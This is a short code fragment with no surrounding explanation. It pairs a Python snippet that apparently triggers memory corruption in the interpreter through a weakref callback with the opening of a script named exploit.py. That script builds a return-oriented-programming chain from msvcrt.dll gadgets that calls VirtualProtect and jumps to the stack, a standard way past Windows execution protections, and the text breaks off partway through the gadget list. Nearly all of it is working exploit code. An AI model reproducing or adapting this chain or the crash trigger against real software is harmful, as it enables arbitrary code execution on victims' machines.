import weakref
class A(object):pass
def callback(x):del lst[0]
keepali0e=[]
lst=[str()]
a=A()
a.c=a
keepali0e.append(weakref.ref(a,callback))
del a
while lst:keepali0e.append(lst[:])

# exploit.py
#!/usr/bin/python
# -*- coding:utf-8 -*-
import sys
import struct
import zlib
import zio
import gzip

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x77c35459,  # POP EAX # RETN [msvcrt.dll] 
      0x77c1372a,  # <- *&VirtualProtect() [IAT msvcrt.dll]
      0x77c2e493,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [msvcrt.dll] 
      0x77c47705,  # XCHG EAX,ESI # RETN [msvcrt.dll] 
      0x77c3b860,  # POP EBP # RETN [msvcrt.dll] 
      0x77c46100,  # & jmp esp [msvcrt.dll]
